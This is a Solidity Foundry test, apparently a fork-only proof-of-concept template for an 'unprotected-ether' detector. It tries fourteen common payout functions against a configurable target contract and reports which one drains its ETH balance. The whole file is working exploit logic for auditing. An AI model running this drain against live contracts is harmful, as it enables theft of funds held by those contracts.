// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Open drain (unprotected ether send)
/// @notice Detector: unprotected-ether. A payout function has no access
///         check and no entitlement bound, so ANY caller can drain the
///         contract's balance.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. Tries the common payout selectors in turn;
///      each attempt must move funds to count as proof (a fallback fn that
///      silently succeeds proves nothing).

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// Try each plausible entry point and accept the first that changes the
    /// OBSERVABLE -- never the first that returns. A no-op or already-guarded
    /// function returns successfully and changes nothing, so judging by the call
    /// result reports "not reproduced" for a vulnerability that exists under
    /// another name.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (ok && target.balance < before) return label;
        return "";
    }

    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        used = _attempt(attacker, before, "withdraw()", abi.encodeWithSignature("withdraw()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "claim()", abi.encodeWithSignature("claim()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "drain()", abi.encodeWithSignature("drain()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "withdrawAll()", abi.encodeWithSignature("withdrawAll()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "sweep()", abi.encodeWithSignature("sweep()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "withdraw(address)",
            abi.encodeWithSignature("withdraw(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "withdrawTo(address)",
            abi.encodeWithSignature("withdrawTo(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "collect()", abi.encodeWithSignature("collect()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "payout()", abi.encodeWithSignature("payout()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "release()", abi.encodeWithSignature("release()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "rescueETH(uint256)",
            abi.encodeWithSignature("rescueETH(uint256)", before)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "rescueETH()", abi.encodeWithSignature("rescueETH()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "rescue(address,uint256)",
            abi.encodeWithSignature("rescue(address,uint256)", attacker, before)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "withdrawAllETH()", abi.encodeWithSignature("withdrawAllETH()"));
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        uint256 targetBefore = target.balance;
        require(targetBefore > 0, "target holds no ETH to drain");

        uint256 before = target.balance;
        string memory used = _tryEntry(attackerEOA, before);
        console.log("entry point that changed state:", used);

        uint256 drained = targetBefore - target.balance;
        console.log("target balance before:", targetBefore);
        console.log("target balance after:", target.balance);
        assertGt(
            drained,
            0,
            "no payout selector moved ETH out of the target. Tried withdraw(), claim(), drain(), withdrawAll(), sweep(), withdraw(address), withdrawTo(address), collect(), payout(), release(), rescueETH(uint256), rescueETH(), rescue(address,uint256), withdrawAllETH(). This does NOT establish safety: the payout may be guarded by an owner check, named differently, take other arguments, or be reachable only by a specific caller."
        );
    }
}
